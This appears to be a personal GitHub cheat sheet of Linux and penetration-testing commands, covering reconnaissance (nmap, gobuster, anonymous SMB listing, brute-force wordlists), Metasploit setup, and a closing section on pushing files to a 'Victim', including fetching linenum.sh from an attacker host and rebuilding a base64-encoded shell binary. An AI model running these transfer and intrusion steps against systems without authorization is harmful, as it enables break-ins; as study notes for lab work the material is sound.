# Linux-usseful-commands
Personal repository for linux commands

## General

netstat -rn 

>Show active network disponibility


![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/1c5d8aae-c2e7-4e6e-a237-f18bccd9de85)


tree

>Make a tree for folder path


![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/d5109cec-91f0-4d0a-8c22-8a84beb3a512)


arp -a IP_ADDRESS 

>Show MAC from IP LAN


![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/d2fc4ff4-a3ae-4c20-bdec-2957ea4d78f2)


script NAME

>Save all previous input for log
>
>**exit** in terminal for terminate


## Scanning

### WEB SCAN

Whatweb http://94.237.62.2/

> out-> http://94.237.62.2 [301 Moved Permanently] Country[FINLAND][FI], IP[94.237.62.2], RedirectLocation[https://94.237.62.2/]

### LISTS

SecLists

> [!NOTE]
> 
> Main list for brute force


![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/e4cde0a2-d9f3-4661-92ef-230bfe497555)


### SAMBA SCAN

smbclient -N -L \\\\[IP]

> Used for access smb
>
> -N used for ignore password request
>
> -L used for list all share directories

![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/84cc86d1-0d1a-4b83-9fcb-1b07f09385dd)


### SCAN PORTS

nmap -sC -sV -p21 [IP or URL]

> Scan ports
>
> -sC -> Scan with script default
>
> -sV -> Scan version and service
> 
> -p21 -> port 21

Example:

>nmap --script smb-os-discovery.nse -p445 10.10.10.40
>
>--script use a script to reach something.
>
>-p445 is the port of scan
>
>10.10.10.40 is the IP


### WEB ENUMERATION

gobuster -m [MODE] -u [URL] -w [LIST]

> Enumeration for discover paths on web server

![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/176134ff-14ae-4212-a163-e2c7e7d49df8)


### OTHERS

SITE.COM\robots.txt
> User-agend: *
> 
> Used for disallowed paths

![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/afd67f3c-c18e-4968-8ef2-f08c8b9c360f)


<!--FINAL SCANNING-->


## Exploit

### SEARCH EXPLOIT

go-exploitdb

> install-> sudo apt install go-exploitdb -y
>
> usage:
>
> go-exploitdb search openssh 7.2

 ![image](https://github.com/esmeraldino-lk/Linux-usseful-commands/assets/133903212/184015ec-83a4-4f7f-8ebc-8b6f541193ef)

### METASPLOIT

msfconsole

>Main package for search and test publics exploits

Install on Ubuntu:

>wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
>
>chmod +x file
>
>sudo ./file

### DOWNLOAD FILE FOR REVERSE SHELL

Python Server

>Server: python3 -m http.server 8000
>
>Victim: wget http://10.10.14.1:8000/linenum.sh
>
>OR
>
>Victim: curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
>
>OR
>
>Victim: scp linenum.sh user@remotehost:/tmp/linenum.sh
>
>OR TRANFER WITH BASE64 FOR BLOCKS
>
>SERVER: base64 shell -w 0
>
>VICTIM: echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell


### 



